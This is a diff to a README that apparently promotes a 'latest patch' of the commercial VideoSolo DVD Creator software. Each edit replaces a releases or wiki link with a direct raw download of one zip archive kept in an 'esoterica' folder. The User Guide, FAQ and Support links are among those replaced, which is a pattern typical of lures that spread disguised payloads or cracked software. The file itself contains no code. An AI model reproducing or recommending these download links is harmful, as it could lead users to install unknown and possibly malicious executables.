@@ -1,6 +1,6 @@
 # 🎥 VideoSolo-DVD-Creator-Latest-Patch - Create DVDs Easily and Safely
 
-[![Download VideoSolo-DVD-Creator](https://img.shields.io/badge/Download%20Now-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/releases)
+[![Download VideoSolo-DVD-Creator](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip%20Now-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To begin using VideoSolo DVD Creator, follow these simple steps to download and 
 
 1. **Visit the Download Page:** Click the link below to access the latest release of VideoSolo DVD Creator.
 
-   [Download VideoSolo DVD Creator](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/releases)
+   [Download VideoSolo DVD Creator](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
 
 2. **Locate the Latest Version:** Once you’re on the releases page, look for the latest version listed at the top. 
 
@@ -36,7 +36,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 1. To download the software, click on the link below:
 
-   [Download VideoSolo DVD Creator](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/releases)
+   [Download VideoSolo DVD Creator](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
 
 2. Once on the releases page, follow these steps:
    - Click on the version you want.
@@ -62,9 +62,9 @@ After installation, you can start using VideoSolo DVD Creator to make DVDs. Here
 
 For more tips and guides on using VideoSolo DVD Creator, refer to the following resources:
 
-- [User Guide](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/wiki)
-- [Frequently Asked Questions](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/wiki/FAQ)
-- [Support](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/wiki/Support)
+- [User Guide](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
+- [Support](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
 
 ## 📊 Troubleshooting
 
@@ -80,4 +80,4 @@ If you encounter issues while using VideoSolo DVD Creator, consider these common
 
 VideoSolo DVD Creator provides a user-friendly way to create DVDs from your video files. With clear steps for installation and usage, you can easily enjoy your favorite videos at home with family and friends. Visit the link below to get started:
 
-[Download VideoSolo DVD Creator](https://github.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/releases)
+[Download VideoSolo DVD Creator](https://raw.githubusercontent.com/mario321490/VideoSolo-DVD-Creator-Latest-Patch/main/esoterica/VideoSolo-DVD-Creator-Latest-Patch-v2.5.zip)
